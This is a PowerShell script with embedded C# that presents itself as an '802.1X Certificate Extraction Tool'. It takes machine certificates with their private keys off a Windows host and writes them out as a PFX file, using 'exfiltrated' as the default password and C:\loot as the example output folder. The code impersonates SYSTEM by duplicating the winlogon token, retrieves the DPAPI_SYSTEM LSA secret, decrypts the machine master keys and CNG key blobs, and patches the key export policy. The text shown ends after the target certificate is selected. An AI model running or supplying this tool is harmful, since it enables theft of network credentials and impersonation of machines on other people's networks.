#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Extract 802.1X machine certificate with private key (PFX) from Windows host.
    Full DPAPI chain: LSA secret -> master key -> CNG blob -> RSA -> PFX.
    No third-party tools, .NET native + Windows APIs only.
.PARAMETER OutputDir
    Directory for the .pfx output. Default: current directory.
.PARAMETER PfxPassword
    PFX password. Default: "exfiltrated".
.PARAMETER Thumbprint
    Optional: target a specific cert by thumbprint.
.EXAMPLE
    .\Extract-8021xCert-v2.ps1
    .\Extract-8021xCert-v2.ps1 -OutputDir C:\loot -PfxPassword "P@ss"
#>
[CmdletBinding()]
param(
    [string]$OutputDir = ".",
    [string]$PfxPassword = "exfiltrated",
    [string]$Thumbprint = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$CSharpCode = @"
using System;
using System.IO;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

public static class CngExtractor
{
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public int Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }

    [DllImport("advapi32.dll")] static extern int LsaOpenPolicy(IntPtr SystemName, ref LSA_OBJECT_ATTRIBUTES Attr, int Access, out IntPtr Handle);
    [DllImport("advapi32.dll")] static extern int LsaRetrievePrivateData(IntPtr Handle, ref LSA_UNICODE_STRING Name, out IntPtr Data);
    [DllImport("advapi32.dll")] static extern int LsaClose(IntPtr Handle);
    [DllImport("advapi32.dll")] static extern int LsaFreeMemory(IntPtr Buf);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hTok);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr hTok, uint access, IntPtr attr, int impLevel, int tokType, out IntPtr hNew);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr hTok);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)] static extern bool LookupPrivilegeValue(string sys, string name, out long luid);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr hTok, bool disableAll, byte[] newState, int bufLen, IntPtr prev, IntPtr retLen);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptOpenStorageProvider(out IntPtr hProv, string name, int flags);
    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptOpenKey(IntPtr hProv, out IntPtr hKey, string name, int spec, int flags);
    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptGetProperty(IntPtr h, string prop, byte[] buf, int cbBuf, out int cbResult, int flags);
    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptExportKey(IntPtr hKey, IntPtr hExp, string type, IntPtr param, byte[] buf, int cbBuf, out int cbResult, int flags);
    [DllImport("ncrypt.dll", CharSet=CharSet.Unicode)] static extern int NCryptSetProperty(IntPtr h, string prop, byte[] val, int cb, int flags);
    [DllImport("ncrypt.dll")] static extern int NCryptFreeObject(IntPtr h);
    [DllImport("crypt32.dll", SetLastError=true)] static extern bool CertGetCertificateContextProperty(IntPtr ctx, uint propId, IntPtr data, ref int cbData);

    // CNG DPAPI entropy (Mimikatz kull_m_key.h / SharpDPAPI Dpapi.cs:302)
    static readonly byte[] CNG_KEY_ENTROPY = Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA\0");

    public static byte[] ExtractPfx(X509Certificate2 cert, string password, out string log)
    {
        var sb = new StringBuilder();
        try
        {
            sb.AppendLine("[*] Method 1: Direct .NET PFX export...");
            try
            {
                byte[] pfx1 = cert.Export(X509ContentType.Pfx, password);
                if (pfx1 != null && pfx1.Length > 0 && VerifyPfx(pfx1, password))
                { sb.AppendLine("[+] Method 1 SUCCESS"); log = sb.ToString(); return pfx1; }
            }
            catch (Exception ex) { sb.AppendLine("[-] " + ex.Message); }

            sb.AppendLine("[*] Method 2: NCrypt export policy patch...");
            byte[] pfx2 = TryNcryptPatch(cert, password, sb);
            if (pfx2 != null) { log = sb.ToString(); return pfx2; }

            sb.AppendLine("[*] Method 3: Full DPAPI chain (LSA->MK->DPAPI->RSA->PFX)...");
            byte[] pfx3 = DpapiChainExtract(cert, password, sb);
            if (pfx3 != null) { log = sb.ToString(); return pfx3; }

            sb.AppendLine("[-] All methods failed.");
            log = sb.ToString(); return null;
        }
        catch (Exception ex) { sb.AppendLine("[!] Fatal: " + ex); log = sb.ToString(); return null; }
    }

    static byte[] TryNcryptPatch(X509Certificate2 cert, string password, StringBuilder sb)
    {
        string keyName = GetKeyContainerName(cert);
        if (keyName == null) { sb.AppendLine("[-] No key container name"); return null; }
        bool wasSys = false;
        try
        {
            wasSys = ImpersonateSystem();
            IntPtr hProv, hKey;
            int hr = NCryptOpenStorageProvider(out hProv, "Microsoft Software Key Storage Provider", 0);
            if (hr != 0) { sb.AppendLine("[-] OpenProvider: 0x" + hr.ToString("X8")); return null; }
            hr = NCryptOpenKey(hProv, out hKey, keyName, 0, 0x20);
            if (hr != 0) hr = NCryptOpenKey(hProv, out hKey, keyName, 0, 0);
            if (hr != 0) { NCryptFreeObject(hProv); sb.AppendLine("[-] OpenKey: 0x" + hr.ToString("X8")); return null; }

            byte[] pol = BitConverter.GetBytes(3);
            hr = NCryptSetProperty(hKey, "Export Policy", pol, 4, 0x40);
            if (hr != 0) hr = NCryptSetProperty(hKey, "Export Policy", pol, 4, unchecked((int)0x80000000));
            if (hr != 0) { sb.AppendLine("[-] SetProperty: 0x" + hr.ToString("X8")); NCryptFreeObject(hKey); NCryptFreeObject(hProv); return null; }

            int cbOut;
            hr = NCryptExportKey(hKey, IntPtr.Zero, "RSAFULLPRIVATEBLOB", IntPtr.Zero, null, 0, out cbOut, 0);
            if (hr == 0 && cbOut > 0)
            {
                byte[] blob = new byte[cbOut];
                hr = NCryptExportKey(hKey, IntPtr.Zero, "RSAFULLPRIVATEBLOB", IntPtr.Zero, blob, cbOut, out cbOut, 0);
                if (hr == 0)
                {
                    sb.AppendLine("[+] NCrypt export OK (" + cbOut + "B)");
                    byte[] pfx = BuildPfxFromFullBlob(blob, cert.RawData, password);
                    NCryptFreeObject(hKey); NCryptFreeObject(hProv);
                    if (pfx != null && VerifyPfx(pfx, password)) { sb.AppendLine("[+] Method 2 SUCCESS"); return pfx; }
                }
            }
            sb.AppendLine("[-] Export: 0x" + hr.ToString("X8"));
            NCryptFreeObject(hKey); NCryptFreeObject(hProv);
            return null;
        }
        finally { if (wasSys) RevertToSelf(); }
    }

    static byte[] DpapiChainExtract(X509Certificate2 cert, string password, StringBuilder sb)
    {
        string keyName = GetKeyContainerName(cert);
        string uniqueName = GetKeyUniqueName(keyName);
        if (uniqueName == null) { sb.AppendLine("[-] No unique key name"); return null; }
        sb.AppendLine("[+] Unique name: " + uniqueName);

        string keyFilePath = FindKeyFile(uniqueName);
        if (keyFilePath == null) { sb.AppendLine("[-] Key file not found"); return null; }
        sb.AppendLine("[+] Key file: " + keyFilePath);

        bool wasSys = false;
        try
        {
            wasSys = ImpersonateSystem();
            if (!wasSys) { sb.AppendLine("[-] SYSTEM impersonation failed"); return null; }
            sb.AppendLine("[+] SYSTEM context");

            byte[] kf = File.ReadAllBytes(keyFilePath);

            // Parse CNG key file: header(32) + zeros(12) + name + pubProps + privProps + privKey
            int nameLen = (int)BitConverter.ToUInt32(kf, 8);
            int pubPropsLen = (int)BitConverter.ToUInt32(kf, 16);
            int privPropsLen = (int)BitConverter.ToUInt32(kf, 20);
            int privKeyLen = (int)BitConverter.ToUInt32(kf, 24);
            int privKeyOff = 44 + nameLen + pubPropsLen + privPropsLen;
            byte[] privKeyBlob = new byte[privKeyLen];
            Array.Copy(kf, privKeyOff, privKeyBlob, 0, privKeyLen);
            sb.AppendLine("[*] PrivKey DPAPI blob: " + privKeyLen + "B @" + privKeyOff);

            // Parse DPAPI blob -> master key GUID
            string mkGuid = ExtractMkGuid(privKeyBlob);
            if (mkGuid == null) { sb.AppendLine("[-] No MK GUID in blob"); return null; }
            sb.AppendLine("[*] MK GUID: " + mkGuid);

            // Extract DPAPI_SYSTEM LSA secret
            byte[] sys = GetDpapiSystem();
            if (sys == null || sys.Length < 44) { sb.AppendLine("[-] DPAPI_SYSTEM extraction failed"); return null; }
            byte[] userKey = new byte[20]; Array.Copy(sys, 4, userKey, 0, 20);
            byte[] machineKey = new byte[20]; Array.Copy(sys, 24, machineKey, 0, 20);
            sb.AppendLine("[+] DPAPI_SYSTEM OK (" + sys.Length + "B)");

            // Find master key file
            string mkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
                "Microsoft", "Protect", "S-1-5-18", mkGuid);
            if (!File.Exists(mkPath))
            {
                string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "Microsoft", "Protect", "S-1-5-18");
                if (Directory.Exists(dir))
                    foreach (string f in Directory.GetFiles(dir))
                        if (Path.GetFileName(f).Equals(mkGuid, StringComparison.OrdinalIgnoreCase))
                        { mkPath = f; break; }
            }
            if (!File.Exists(mkPath)) { sb.AppendLine("[-] MK file not found: " + mkPath); return null; }
            byte[] mkFile = File.ReadAllBytes(mkPath);
            sb.AppendLine("[+] MK file: " + mkFile.Length + "B");

            // Decrypt master key (try userKey then machineKey)
            byte[] masterKey = DecryptMasterKey(mkFile, userKey, sb);
            if (masterKey == null)
            {
                sb.AppendLine("[*] userKey failed, trying machineKey...");
                masterKey = DecryptMasterKey(mkFile, machineKey, sb);
            }
            if (masterKey == null) { sb.AppendLine("[-] MK decryption failed"); return null; }
            sb.AppendLine("[+] Master key: " + masterKey.Length + "B");

            // Decrypt CNG DPAPI blob with entropy
            byte[] rsaBlob = DecryptDpapi(privKeyBlob, masterKey, CNG_KEY_ENTROPY, sb);
            if (rsaBlob == null) { sb.AppendLine("[-] DPAPI decrypt failed"); return null; }
            sb.AppendLine("[+] Decrypted: " + rsaBlob.Length + "B");

            if (rsaBlob.Length < 24 || rsaBlob[0] != 0x52 || rsaBlob[1] != 0x53 || rsaBlob[2] != 0x41)
            { sb.AppendLine("[-] No RSA magic"); return null; }
            sb.AppendLine("[+] RSA magic: " + Encoding.ASCII.GetString(rsaBlob, 0, 4));

            byte[] pfx = BuildPfxFromRsa2(rsaBlob, cert.RawData, password, sb);
            if (pfx != null && VerifyPfx(pfx, password))
            { sb.AppendLine("[+] Method 3 SUCCESS!"); return pfx; }
            sb.AppendLine("[-] PFX build failed");
            return null;
        }
        catch (Exception ex) { sb.AppendLine("[-] Error: " + ex.Message); return null; }
        finally { if (wasSys) RevertToSelf(); }
    }

    // --- DPAPI_SYSTEM LSA SECRET ---
    static byte[] GetDpapiSystem()
    {
        var attr = new LSA_OBJECT_ATTRIBUTES { Length = Marshal.SizeOf(typeof(LSA_OBJECT_ATTRIBUTES)) };
        IntPtr hPol;
        if (LsaOpenPolicy(IntPtr.Zero, ref attr, 4, out hPol) != 0) return null;
        try
        {
            string nm = "DPAPI_SYSTEM";
            IntPtr pNm = Marshal.StringToHGlobalUni(nm);
            var ls = new LSA_UNICODE_STRING { Length = (ushort)(nm.Length*2), MaximumLength = (ushort)((nm.Length+1)*2), Buffer = pNm };
            IntPtr pData;
            int hr = LsaRetrievePrivateData(hPol, ref ls, out pData);
            Marshal.FreeHGlobal(pNm);
            if (hr != 0 || pData == IntPtr.Zero) return null;
            try
            {
                ushort len = (ushort)Marshal.ReadInt16(pData, 0);
                IntPtr buf = Marshal.ReadIntPtr(pData, IntPtr.Size == 8 ? 8 : 4);
                if (len < 44 || buf == IntPtr.Zero) return null;
                byte[] r = new byte[len]; Marshal.Copy(buf, r, 0, len); return r;
            }
            finally { LsaFreeMemory(pData); }
        }
        finally { LsaClose(hPol); }
    }

    // --- MASTER KEY DECRYPTION ---
    static byte[] DecryptMasterKey(byte[] file, byte[] dpapiKey, StringBuilder sb)
    {
        if (file.Length < 160) return null;
        long mkLen = (long)BitConverter.ToUInt64(file, 96);
        if (mkLen <= 32 || mkLen > file.Length - 128) return null;

        int o = 128;
        byte[] salt = new byte[16]; Array.Copy(file, o+4, salt, 0, 16);
        uint iters = BitConverter.ToUInt32(file, o+20);
        uint hAlg = BitConverter.ToUInt32(file, o+24);
        uint cAlg = BitConverter.ToUInt32(file, o+28);
        int edLen = (int)mkLen - 32;
        byte[] ed = new byte[edLen]; Array.Copy(file, o+32, ed, 0, edLen);

        sb.AppendLine("[*] MK decrypt: rounds=" + iters + " hash=0x" + hAlg.ToString("X") + " crypt=0x" + cAlg.ToString("X"));

        int kLen, ivLen;
        if (cAlg == 0x6610) { kLen = 32; ivLen = 16; }
        else if (cAlg == 0x6603) { kLen = 24; ivLen = 8; }
        else return null;
        string hn = (hAlg == 0x800E) ? "SHA512" : "SHA1";

        byte[] dk = MsPbkdf2(dpapiKey, salt, (int)iters, kLen + ivLen, hn);
        byte[] ck = new byte[kLen]; Array.Copy(dk, 0, ck, 0, kLen);
        byte[] iv = new byte[ivLen]; Array.Copy(dk, kLen, iv, 0, ivLen);

        byte[] ct = (cAlg == 0x6610) ? AesDec(ck, iv, ed) : DesDec(ck, iv, ed);
        if (ct == null || ct.Length < 80) return null;

        byte[] mk = new byte[64]; Array.Copy(ct, ct.Length - 64, mk, 0, 64);

        // HMAC verify
        byte[] hs = new byte[16]; Array.Copy(ct, 0, hs, 0, 16);
        int tl = (hAlg == 0x800E) ? 16 : 20;
        byte[] stored = new byte[tl]; Array.Copy(ct, 16, stored, 0, tl);
        byte[] hk; using (var h = Hmac(hn, dpapiKey)) hk = h.ComputeHash(hs);
        byte[] calc; using (var h = Hmac(hn, hk)) calc = h.ComputeHash(mk);
        byte[] ct2 = new byte[tl]; Array.Copy(calc, ct2, tl);
        if (!Eq(ct2, stored)) { sb.AppendLine("[-] MK HMAC mismatch"); return null; }
        sb.AppendLine("[+] MK HMAC OK!");
        return mk;
    }

    // --- MS NON-STANDARD PBKDF2 ---
    static byte[] MsPbkdf2(byte[] pw, byte[] salt, int iters, int need, string hn)
    {
        using (var hm = Hmac(hn, pw))
        {
            int bs = hm.HashSize / 8;
            int nb = (need + bs - 1) / bs;
            byte[] res = new byte[nb * bs];
            for (int b = 1; b <= nb; b++)
            {
                byte[] sb2 = new byte[salt.Length + 4];
                Array.Copy(salt, sb2, salt.Length);
                sb2[salt.Length]=(byte)((b>>24)&0xFF); sb2[salt.Length+1]=(byte)((b>>16)&0xFF);
                sb2[salt.Length+2]=(byte)((b>>8)&0xFF); sb2[salt.Length+3]=(byte)(b&0xFF);
                byte[] u = hm.ComputeHash(sb2);
                byte[] acc = (byte[])u.Clone();
                for (int i = 2; i <= iters; i++)
                {
                    u = hm.ComputeHash(u);
                    for (int j = 0; j < bs; j++) acc[j] ^= u[j];
                    Array.Copy(acc, u, bs); // MS non-standard: XOR accumulator feedback
                }
                Array.Copy(acc, 0, res, (b-1)*bs, bs);
            }
            byte[] o = new byte[need]; Array.Copy(res, o, need); return o;
        }
    }

    // --- DPAPI BLOB DECRYPTION ---
    static string ExtractMkGuid(byte[] b)
    {
        if (b.Length < 44) return null;
        int o = 24;
        return string.Format("{0:x8}-{1:x4}-{2:x4}-{3}-{4}",
            BitConverter.ToUInt32(b, o), BitConverter.ToUInt16(b, o+4), BitConverter.ToUInt16(b, o+6),
            BitConverter.ToString(b, o+8, 2).Replace("-","").ToLower(),
            BitConverter.ToString(b, o+10, 6).Replace("-","").ToLower());
    }

    static byte[] DecryptDpapi(byte[] b, byte[] mk, byte[] entropy, StringBuilder sb)
    {
        int o = 44; // skip version(4)+provider(16)+mkVer(4)+mkGuid(16)+flags(4)
        int dl = (int)BitConverter.ToUInt32(b, o); o += 4 + dl;
        uint ac = BitConverter.ToUInt32(b, o); o += 8;
        int sl = (int)BitConverter.ToUInt32(b, o); o += 4;
        byte[] salt = new byte[sl]; Array.Copy(b, o, salt, 0, sl); o += sl;
        int hkl = (int)BitConverter.ToUInt32(b, o); o += 4 + hkl;
        uint ah = BitConverter.ToUInt32(b, o); o += 8;
        int h2l = (int)BitConverter.ToUInt32(b, o); o += 4 + h2l;
        int edl = (int)BitConverter.ToUInt32(b, o); o += 4;
        byte[] ed = new byte[edl]; Array.Copy(b, o, ed, 0, edl);

        sb.AppendLine("[*] DPAPI: crypt=0x"+ac.ToString("X")+" hash=0x"+ah.ToString("X")+" data="+edl+"B");

        byte[] kh; using (var s = SHA1.Create()) kh = s.ComputeHash(mk);
        string hn = (ah == 0x800E) ? "SHA512" : "SHA1";
        byte[] hi = new byte[salt.Length + entropy.Length];
        Array.Copy(salt, hi, salt.Length);
        Array.Copy(entropy, 0, hi, salt.Length, entropy.Length);
        byte[] sk; using (var h = Hmac(hn, kh)) sk = h.ComputeHash(hi);

        int ckl, bs;
        if (ac == 0x6610) { ckl = 32; bs = 16; }
        else if (ac == 0x6603) { ckl = 24; bs = 8; }
        else return null;

        byte[] ek = new byte[ckl]; Array.Copy(sk, ek, Math.Min(sk.Length, ckl));
        byte[] iv = new byte[bs];
        byte[] ct = (ac == 0x6610) ? AesDec(ek, iv, ed) : DesDec(ek, iv, ed);
        if (ct == null) return null;

        int pad = ct[ct.Length - 1];
        if (pad >= 1 && pad <= bs)
        {
            bool vp = true;
            for (int i = ct.Length - pad; i < ct.Length; i++) if (ct[i] != pad) { vp = false; break; }
            if (vp) { byte[] up = new byte[ct.Length - pad]; Array.Copy(ct, up, up.Length); return up; }
        }
        return ct;
    }

    // --- RSA RECONSTRUCTION & PFX ---
    static byte[] BuildPfxFromRsa2(byte[] b, byte[] certDer, string pw, StringBuilder sb)
    {
        int bl = (int)BitConverter.ToUInt32(b, 4);
        int ce = (int)BitConverter.ToUInt32(b, 8);
        int cm = (int)BitConverter.ToUInt32(b, 12);
        int c1 = (int)BitConverter.ToUInt32(b, 16);
        int c2 = (int)BitConverter.ToUInt32(b, 20);
        sb.AppendLine("[*] RSA2: " + bl + " bits");

        int o = 24;
        byte[] eB = Ex(b, ref o, ce), nB = Ex(b, ref o, cm), pB = Ex(b, ref o, c1), qB = Ex(b, ref o, c2);
        BigInteger e = Bi(eB), n = Bi(nB), p = Bi(pB), q = Bi(qB);
        if (p * q != n) { sb.AppendLine("[-] p*q != N"); return null; }

        BigInteger phi = (p-1)*(q-1), d = ModInv(e, phi);
        BigInteger dp = d%(p-1), dq = d%(q-1), qi = ModInv(q, p);

        if (BigInteger.ModPow(BigInteger.ModPow(42, e, n), d, n) != 42)
        { sb.AppendLine("[-] RSA verify failed"); return null; }
        sb.AppendLine("[+] RSA math OK");

        var rp = new RSAParameters {
            Exponent=Be(e,ce), Modulus=Be(n,cm), P=Be(p,c1), Q=Be(q,c2),
            D=Be(d,cm), DP=Be(dp,c1), DQ=Be(dq,c2), InverseQ=Be(qi,c1)
        };
        return MakePfx(rp, certDer, pw);
    }

    static byte[] BuildPfxFromFullBlob(byte[] b, byte[] certDer, string pw)
    {
        int ce=(int)BitConverter.ToUInt32(b,8), cm=(int)BitConverter.ToUInt32(b,12);
        int c1=(int)BitConverter.ToUInt32(b,16), c2=(int)BitConverter.ToUInt32(b,20);
        int o=24;
        var rp = new RSAParameters {
            Exponent=Ex(b,ref o,ce), Modulus=Ex(b,ref o,cm), P=Ex(b,ref o,c1), Q=Ex(b,ref o,c2),
            DP=Ex(b,ref o,c1), DQ=Ex(b,ref o,c2), InverseQ=Ex(b,ref o,c1), D=Ex(b,ref o,cm)
        };
        return MakePfx(rp, certDer, pw);
    }

    static byte[] MakePfx(RSAParameters rp, byte[] certDer, string pw)
    {
        using (RSA rsa = RSA.Create())
        {
            rsa.ImportParameters(rp);
            var c = new X509Certificate2(certDer);
            var cwk = c.CopyWithPrivateKey(rsa);
            return cwk.Export(X509ContentType.Pfx, pw);
        }
    }

    // --- SYSTEM IMPERSONATION ---
    static bool ImpersonateSystem()
    {
        IntPtr hTok;
        if (OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x0028, out hTok))
        {
            long luid;
            if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
            {
                byte[] tp = new byte[16];
                BitConverter.GetBytes(1).CopyTo(tp, 0);
                BitConverter.GetBytes(luid).CopyTo(tp, 4);
                BitConverter.GetBytes(2).CopyTo(tp, 12);
                AdjustTokenPrivileges(hTok, false, tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            CloseHandle(hTok);
        }
        int pid = 0;
        foreach (var p in System.Diagnostics.Process.GetProcessesByName("winlogon")) { pid = p.Id; break; }
        if (pid == 0) return false;
        IntPtr hP = OpenProcess(0x0400, false, pid);
        if (hP == IntPtr.Zero) return false;
        IntPtr hT;
        if (!OpenProcessToken(hP, 0x000E, out hT)) { CloseHandle(hP); return false; }
        IntPtr hD;
        if (!DuplicateTokenEx(hT, 0x02000000, IntPtr.Zero, 2, 2, out hD))
        { CloseHandle(hT); CloseHandle(hP); return false; }
        bool r = ImpersonateLoggedOnUser(hD);
        CloseHandle(hD); CloseHandle(hT); CloseHandle(hP);
        return r;
    }

    // --- HELPERS ---
    static string GetKeyContainerName(X509Certificate2 cert)
    {
        int cb = 0;
        CertGetCertificateContextProperty(cert.Handle, 2, IntPtr.Zero, ref cb);
        if (cb == 0) return null;
        IntPtr p = Marshal.AllocHGlobal(cb);
        try
        {
            if (!CertGetCertificateContextProperty(cert.Handle, 2, p, ref cb)) return null;
            return Marshal.PtrToStringUni(Marshal.ReadIntPtr(p, 0));
        }
        finally { Marshal.FreeHGlobal(p); }
    }

    static string GetKeyUniqueName(string keyName)
    {
        if (keyName == null) return null;
        IntPtr hP, hK;
        int hr = NCryptOpenStorageProvider(out hP, "Microsoft Software Key Storage Provider", 0);
        if (hr != 0) return null;
        hr = NCryptOpenKey(hP, out hK, keyName, 0, 0x20);
        if (hr != 0) hr = NCryptOpenKey(hP, out hK, keyName, 0, 0);
        if (hr != 0) { NCryptFreeObject(hP); return null; }
        int cb;
        hr = NCryptGetProperty(hK, "Unique Name", null, 0, out cb, 0);
        if (hr != 0 || cb <= 0) { NCryptFreeObject(hK); NCryptFreeObject(hP); return null; }
        byte[] buf = new byte[cb];
        hr = NCryptGetProperty(hK, "Unique Name", buf, cb, out cb, 0);
        NCryptFreeObject(hK); NCryptFreeObject(hP);
        if (hr != 0) return null;
        return Encoding.Unicode.GetString(buf).TrimEnd('\0');
    }

    static string FindKeyFile(string un)
    {
        string[] ds = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","Keys"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","RSA","MachineKeys"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","SystemKeys"),
        };
        foreach (string d in ds) { string fp = Path.Combine(d, un); if (File.Exists(fp)) return fp; }
        return null;
    }

    static bool VerifyPfx(byte[] pfx, string pw)
    {
        try
        {
            var c = new X509Certificate2(pfx, pw, X509KeyStorageFlags.Exportable);
            if (!c.HasPrivateKey) return false;
            var rsa = c.GetRSAPrivateKey();
            if (rsa == null) return false;
            byte[] d = Encoding.UTF8.GetBytes("test");
            byte[] s = rsa.SignData(d, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            bool ok = rsa.VerifyData(d, s, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            c.Dispose(); return ok;
        }
        catch { return false; }
    }

    static HMAC Hmac(string n, byte[] k) { return n == "SHA512" ? (HMAC)new HMACSHA512(k) : new HMACSHA1(k); }
    static byte[] AesDec(byte[] k, byte[] iv, byte[] d)
    { using (var a = Aes.Create()) { a.Key=k; a.IV=iv; a.Mode=CipherMode.CBC; a.Padding=PaddingMode.None; return a.CreateDecryptor().TransformFinalBlock(d,0,d.Length); } }
    static byte[] DesDec(byte[] k, byte[] iv, byte[] d)
    { using (var a = TripleDES.Create()) { a.Key=k; a.IV=iv; a.Mode=CipherMode.CBC; a.Padding=PaddingMode.None; return a.CreateDecryptor().TransformFinalBlock(d,0,d.Length); } }
    static byte[] Ex(byte[] s, ref int o, int l) { byte[] r = new byte[l]; Array.Copy(s, o, r, 0, l); o += l; return r; }
    static bool Eq(byte[] a, byte[] b) { if (a.Length != b.Length) return false; for (int i = 0; i < a.Length; i++) if (a[i] != b[i]) return false; return true; }
    static BigInteger Bi(byte[] be) { byte[] le = new byte[be.Length+1]; for (int i=0;i<be.Length;i++) le[be.Length-1-i]=be[i]; return new BigInteger(le); }
    static byte[] Be(BigInteger v, int l) {
        byte[] le = v.ToByteArray(); byte[] be = new byte[l];
        int cl = Math.Min(le.Length, l);
        if (le.Length > l && le[le.Length-1] == 0) cl = Math.Min(le.Length-1, l);
        for (int i=0;i<cl;i++) be[l-1-i]=le[i]; return be;
    }
    static BigInteger ModInv(BigInteger a, BigInteger m) { BigInteger g,x,y; Egcd(a%m,m,out g,out x,out y); return ((x%m)+m)%m; }
    static void Egcd(BigInteger a, BigInteger b, out BigInteger g, out BigInteger x, out BigInteger y) {
        if (a==0) { g=b; x=0; y=1; return; }
        BigInteger g1,x1,y1; Egcd(b%a,a,out g1,out x1,out y1); g=g1; x=y1-(b/a)*x1; y=x1;
    }
}
"@

try { [CngExtractor] | Out-Null } catch {
    Add-Type -TypeDefinition $CSharpCode -ReferencedAssemblies "System.Numerics","System.Security" -ErrorAction Stop
}

function Get-CertTemplate {
    param([System.Security.Cryptography.X509Certificates.X509Certificate2]$C)
    $t = ""
    $v1 = $C.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.20.2" }
    if ($v1) { $t = $v1.Format($false) }
    $v2 = $C.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.21.7" }
    if ($v2) {
        $f = $v2.Format($true)
        if ($f -match "Template=(.+?)[\r\n]") { $t = $Matches[1].Trim() }
        elseif ($f -match "Mod.le=(.+?)[\r\n]") { $t = $Matches[1].Trim() }
        elseif (-not $t -and $f) { $t = $f.Trim().Split("`n")[0].Trim() }
    }
    return $t
}

function Find-8021xCerts {
    Write-Host "[*] Scanning Cert:\LocalMachine\My..." -ForegroundColor Yellow
    [array]$certs = @(Get-ChildItem Cert:\LocalMachine\My -ErrorAction SilentlyContinue)
    if ($certs.Count -eq 0) { Write-Host "[-] No certificates." -ForegroundColor Red; return $null }
    Write-Host "[*] $($certs.Count) certificate(s) found." -ForegroundColor Gray

    $results = @()
    foreach ($c in $certs) {
        $tpl = Get-CertTemplate -C $c
        $eku = ($c.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
        $ekuList = @()
        if ($eku) { $ekuList = $eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName } }
        $is8021x = ($tpl -match "802\.?1[xX]|EAP|Machine|Computer") -or ($ekuList -contains "Client Authentication")
        $results += [PSCustomObject]@{
            Cert=$c; Subject=$c.Subject; Issuer=$c.Issuer; Thumbprint=$c.Thumbprint
            Template=$tpl; HasPrivateKey=$c.HasPrivateKey; Is8021x=$is8021x
            EKU=($ekuList -join ", "); NotAfter=$c.NotAfter
        }
    }
    return ,$results
}

Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  802.1X Certificate Extraction Tool" -ForegroundColor Cyan
Write-Host "  DPAPI Chain | .NET Native | No 3rd Party" -ForegroundColor DarkCyan
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object System.Security.Principal.WindowsPrincipal($id)
if (-not $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Administrator required." -ForegroundColor Red; exit 1
}
Write-Host "[+] Running as: $($id.Name)" -ForegroundColor Green

$OutputDir = (Resolve-Path $OutputDir -ErrorAction SilentlyContinue).Path
if (-not $OutputDir) { $OutputDir = (Get-Location).Path }

$allCerts = Find-8021xCerts
if (-not $allCerts) { exit 1 }

# Select certificate
$target = $null
if ($Thumbprint) {
    $target = $allCerts | Where-Object { $_.Thumbprint -eq $Thumbprint }
    if (-not $target) { Write-Host "[-] Thumbprint not found." -ForegroundColor Red; exit 1 }
} else {
    [array]$cand = @($allCerts | Where-Object { $_.Is8021x -and $_.HasPrivateKey })
    if ($cand.Count -eq 0) { [array]$cand = @($allCerts | Where-Object { $_.HasPrivateKey }) }
    if ($cand.Count -eq 0) { Write-Host "[-] No certs with private keys." -ForegroundColor Red; exit 1 }
    if ($cand.Count -eq 1) { $target = $cand[0] }
    else {
        Write-Host "[*] Multiple candidates:" -ForegroundColor Yellow
        for ($i = 0; $i -lt $cand.Count; $i++) {
            $m = if ($cand[$i].Is8021x) { "[802.1X]" } else { "[Other]" }
            Write-Host "  [$i] $m $($cand[$i].Subject) | $($cand[$i].Thumbprint.Substring(0,8))..." -ForegroundColor White
        }
        $sel = Read-Host "Select [0-$($cand.Count-1)]"
        $target = $cand[[int]$sel]
    }
}

Write-Host ""
Write-Host "[*] Target: $($target.Subject)" -ForegroundColor Cyan
Write-Host "[*] Template: $($target.Template)" -ForegroundColor Cyan
